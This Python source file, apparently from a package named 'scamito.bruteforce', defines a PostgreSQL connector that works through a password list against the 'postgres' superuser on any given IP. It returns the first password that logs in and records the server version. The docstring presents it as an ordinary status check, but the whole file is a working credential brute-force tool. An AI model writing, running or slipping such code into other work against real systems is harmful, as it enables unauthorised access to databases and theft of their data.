"""Connect to the remote PostgreSQL database and log a short status."""

import logging

import psycopg

from scamito.bruteforce.abstract_db_conn import AbstractDBConn

log =  logging.getLogger(__name__)


class PostgreSqlConnector(AbstractDBConn):
    @staticmethod
    def connect(ip: str) -> str | None:
        with open("data/password.lst", 'r') as f:
            for password in f:
                log.debug("Trying password", extra={"password": password})
                try:
                    with psycopg.connect(
                            host=ip,
                            port=5432,
                            dbname="postgres",
                            user="postgres",
                            password=password,
                            connect_timeout=10,
                    ) as conn:
                        with conn.cursor() as cur:
                            cur.execute("SELECT version(), current_database(), current_user;")
                            version, database, user = cur.fetchone()
                    log.info(
                        "Connected",
                        extra={"database": database, "user": user, "version": version},
                    )
                    return password
                except psycopg.OperationalError as e:
                    msg = str(e)
                    log.warning("%s: %s", password, msg)
                    if "no pg_hba.conf entry for host" in msg or "connection timeout expired" == msg:
                        return None
            return None